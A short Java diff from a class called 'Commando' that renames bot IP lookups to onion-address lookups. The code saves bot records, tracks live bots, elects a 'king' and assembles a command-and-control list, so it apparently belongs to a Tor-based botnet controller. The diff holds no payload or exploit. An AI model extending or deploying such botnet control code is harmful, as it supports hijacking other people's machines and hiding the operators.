@@ -152,7 +152,7 @@ public class Commando {
 					Bot bot;
 					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(), objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(), objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
 					bServ.save(bot);
-					Pairs<OnionAddress, String> botAlive = new Pairs<OnionAddress, String>(new OnionAddress(bot.getIp()), bot.getIdBot());
+					Pairs<OnionAddress, String> botAlive = new Pairs<OnionAddress, String>(new OnionAddress(bot.getOnionAddress()), bot.getIdBot());
 					nServ.getAliveBot().add(botAlive);
 				}
 			}
@@ -259,8 +259,8 @@ public class Commando {
 		System.out.println("dns updating..");
 		Bot b = bServ.searchBotId(pServ.getNewKing());
 		if (b != null) {
-			System.out.println("bot dns" + b.getIp());
-			OnionAddress ip = new OnionAddress(b.getIp());
+			System.out.println("bot dns" + b.getOnionAddress());
+			OnionAddress ip = new OnionAddress(b.getOnionAddress());
 			String pk = b.getPubKey();
 			newKingDns(ip, pk);
 			System.out.println("dns updated..");
@@ -301,7 +301,7 @@ public class Commando {
 			for (Bot bot : botList) {
 				if (bot.getElegible().equals("true"))
 					if (nServ.getAliveBot().indexOfValue2(bot.getIdBot()) >= 0)
-						ccList.add(bot.getIp());
+						ccList.add(bot.getOnionAddress());
 			}
 		}
 
